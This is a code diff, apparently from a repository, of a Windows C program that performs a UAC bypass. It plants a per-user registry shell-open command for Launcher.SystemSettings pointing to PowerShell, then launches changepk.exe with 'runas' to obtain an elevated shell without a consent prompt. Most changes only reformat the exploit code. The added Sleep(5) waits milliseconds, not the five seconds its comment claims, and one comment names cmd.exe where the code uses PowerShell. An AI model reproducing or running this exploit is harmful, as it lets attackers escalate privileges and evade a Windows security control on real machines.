@@ -10,25 +10,42 @@ BOOL CreateShellOpenCommandRegKey(WCHAR* key, WCHAR* value)
     INT valueLength = 0;
 
     // measure the value string length
-    if (S_OK != StringCbLengthW(value, MAX_PATH, &valueLength))
+    if (S_OK != StringCbLengthW(
+        value, 
+        MAX_PATH,
+        &valueLength))
     {
         return FALSE;
     }
 
     // create the registry key
-    if (ERROR_SUCCESS != RegCreateKey(HKEY_CURRENT_USER, L"Software\\Classes\\Launcher.SystemSettings\\Shell\\Open\\Command", &regKey))
+    if (ERROR_SUCCESS != RegCreateKey(
+        HKEY_CURRENT_USER, 
+        L"Software\\Classes\\Launcher.SystemSettings\\Shell\\Open\\Command", 
+        &regKey))
     {
         return FALSE;
     }
 
     // create the registry value
-    if (ERROR_SUCCESS != RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Classes\\Launcher.SystemSettings\\Shell\\Open\\Command", 0, KEY_ALL_ACCESS, &regKey))
+    if (ERROR_SUCCESS != RegOpenKeyEx(
+        HKEY_CURRENT_USER, 
+        L"Software\\Classes\\Launcher.SystemSettings\\Shell\\Open\\Command",
+        0, 
+        KEY_ALL_ACCESS, 
+        &regKey))
     {
         return FALSE;
     }
 
     // create the key value
-    if (ERROR_SUCCESS != RegSetValueEx(regKey, key, 0, REG_SZ, (LPBYTE)value, valueLength))
+    if (ERROR_SUCCESS != RegSetValueEx(
+        regKey, 
+        key, 
+        0, 
+        REG_SZ, 
+        (LPBYTE)value, 
+        valueLength))
     {
         return FALSE;
     }
@@ -39,7 +56,9 @@ BOOL CreateShellOpenCommandRegKey(WCHAR* key, WCHAR* value)
 BOOL DeleteShellOpenCommandRegKey()
 {
     // delete the registry key
-    if (ERROR_SUCCESS != RegDeleteKey(HKEY_CURRENT_USER, L"Software\\Classes\\Launcher.SystemSettings\\Shell\\Open\\Command"))
+    if (ERROR_SUCCESS != RegDeleteKey(
+        HKEY_CURRENT_USER,
+        L"Software\\Classes\\Launcher.SystemSettings\\Shell\\Open\\Command"))
     {
         return FALSE;
     }
@@ -65,7 +84,9 @@ INT main()
     }
 
     // lay down second registry key
-    if(TRUE != CreateShellOpenCommandRegKey(NULL, L"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe"))
+    if(TRUE != CreateShellOpenCommandRegKey(
+        NULL, 
+        L"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe"))
     {
         return -3;
     }
@@ -77,7 +98,12 @@ INT main()
     }
 
     // kick off changepk.exe, invoking cmd.exe, ignoring returned HINSTANCE
-    ShellExecuteW(NULL, L"runas", L"C:\\Windows\\System32\\changepk.exe", 0, 0, SW_SHOWNORMAL);
+    ShellExecuteW(
+        NULL, 
+        L"runas", L"C:\\Windows\\System32\\changepk.exe",
+        0, 
+        0, 
+        SW_SHOWNORMAL);
 
     // re-enable wow64 bit redirection
     if(TRUE != Wow64RevertWow64FsRedirection(pWow64Redirection))
@@ -98,6 +124,8 @@ INT main()
     }
 
     // sleep for 5 seconds to give powershell some time to launch
+    Sleep(5);
+
     return 0;
 }
 
